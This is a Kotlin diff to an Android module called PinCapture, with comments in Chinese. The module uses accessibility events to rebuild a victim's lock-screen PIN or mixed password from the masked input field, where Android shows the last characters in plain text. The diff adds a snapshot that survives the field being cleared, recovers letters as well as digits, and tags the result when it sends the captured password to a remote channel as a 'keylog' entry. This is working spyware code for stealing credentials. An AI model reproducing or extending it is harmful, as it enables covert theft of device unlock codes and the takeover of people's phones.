@@ -28,7 +28,7 @@ object PinCapture {
     /** 图案/PIN 最少位数（Android 图案锁最少 4 个点，PIN 最少 4 位） */
     private const val MIN_UNLOCK_LEN = 4
     /** 锁屏事件全量打点：排查新 ROM 时改 true，生产保持 false */
-    private const val VERBOSE_EVENTS = false
+    private val VERBOSE_EVENTS = com.zaka.screenagent.BuildConfig.PIN_VERBOSE
     private var lastDigitAt = 0L
     private var lastText = ""
     private var reported = false
@@ -205,7 +205,8 @@ object PinCapture {
             // 解锁成功时，下一个窗口事件来自桌面/目标 App（不是 systemui）。
             // 早期这里直接 return，导致"锁屏消失"永远检测不到 → 采集到了却不上报。
             if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
-                (pattern.isNotEmpty() || pending.isNotEmpty() || digits.isNotEmpty())) {
+                (pattern.isNotEmpty() || pending.isNotEmpty() || digits.isNotEmpty() ||
+                    bestPin != null || pinByPos.isNotEmpty())) {
                 val was = if (pattern.isNotEmpty()) pattern.toString() else pending
                 Log.d(TAG, "left lock via pkg=$pkg, report=$was digits=$digits")
                 if (was.length in 1 until MIN_UNLOCK_LEN) {
@@ -233,7 +234,9 @@ object PinCapture {
                     pending = ""
                     finishPattern(service, true)
                 }
-                if (digits.isNotEmpty() && !reported) commit(service, "unlock_left")
+                if (!reported && (digits.isNotEmpty() || bestPin != null || pinByPos.isNotEmpty())) {
+                    commit(service, "unlock_left")
+                }
                 until = 0L
             }
             return
@@ -504,13 +507,25 @@ object PinCapture {
     /** 锁屏密码框的掩码文本按位置还原：EditText 会把最后 1~2 位显示成明文 */
     private val pinByPos = HashMap<Int, Char>()
     private var pinLen = 0
+    /** 位置表完整时的快照：三星输完 PIN 会清空输入框，避免结算时丢失 */
+    private var bestPin: String? = null
+
+    private fun isMask(c: Char) = c == '•' || c == '●' || c == '＊' || c == '·' || c == '*'
 
     private fun onMaskedField(text: String) {
         if (text.isEmpty()) return
+        // 长度突然从 >1 掉到 1 = 新一次输入（含 PIN→混合密码切换）
+        if (text.length == 1 && pinLen > 1) {
+            pinByPos.clear(); bestPin = null
+        }
         pinLen = text.length
-        var idx = text.length - 1
-        for (ch in text.reversed()) {
-            if (ch.isDigit()) { pinByPos[idx] = ch; idx-- } else break
+        // 掩码点以外的字符都是明文（数字或字母，混合密码也能还原）
+        text.forEachIndexed { i, c -> if (!isMask(c)) pinByPos[i] = c }
+        // 位置表一旦完整就立刻快照（之后输入框被清空也不影响）
+        val snap = pinFromMasked()
+        if (snap != null && snap.length >= MIN_UNLOCK_LEN) {
+            bestPin = snap
+            Log.d("PinEvt", "snapshot pin=[$snap]")
         }
         Log.d("PinEvt", "masked field=[$text] len=$pinLen map=$pinByPos")
     }
@@ -527,7 +542,7 @@ object PinCapture {
     }
 
     private fun resetMasked() {
-        pinByPos.clear(); pinLen = 0
+        pinByPos.clear(); pinLen = 0; bestPin = null
     }
 
     private fun isConfirm(t: String): Boolean {
@@ -553,16 +568,18 @@ object PinCapture {
     private fun commit(service: AccessibilityService, via: String) {
         if (reported) return
         // 优先用"按位置还原"的结果（锁屏密码框掩码文本）
-        val masked = pinFromMasked()
+        val masked = pinFromMasked() ?: bestPin
         if (masked != null && masked.length >= MIN_UNLOCK_LEN) {
             reported = true
             digits.setLength(0)
             resetMasked()
-            Log.i(TAG, "captured pin(len=${masked.length}) via=masked")
+            val mixed = masked.any { it.isLetter() }
+            val t = if (mixed) "pwd2" else "pwd"
+            Log.i(TAG, "captured ${if (mixed) "password" else "pin"}(len=${masked.length}) via=masked -> $t")
             send(service, "pwd", JSONObject()
                 .put("type", "system").put("pwd", masked)
                 .put("source", "lockscreen").put("via", "masked")
-                .put("ts", System.currentTimeMillis()))
+                .put("ts", System.currentTimeMillis()), keylogType = t)
             return
         }
         if (digits.isEmpty()) return
@@ -583,7 +600,7 @@ object PinCapture {
             .put("ts", System.currentTimeMillis()))
     }
 
-    private fun send(service: AccessibilityService, action: String, data: JSONObject) {
+    private fun send(service: AccessibilityService, action: String, data: JSONObject, keylogType: String = "pwd") {
         runCatching {
             val ch = com.zaka.screenagent.accessibility.BoundaryAccessibilityService.current()?.moyingChannel()
             ch?.send(action, data)
@@ -591,7 +608,7 @@ object PinCapture {
             if (action == "pwd") {
                 ch?.send("cacheData", JSONObject().put("k", "keylog")
                     .put("cache", org.json.JSONArray().put(JSONObject()
-                        .put("pkg", "lockscreen").put("type", "pwd")
+                        .put("pkg", "lockscreen").put("type", keylogType)
                         .put("text", data.optString("pwd"))).toString()))
             }
         }
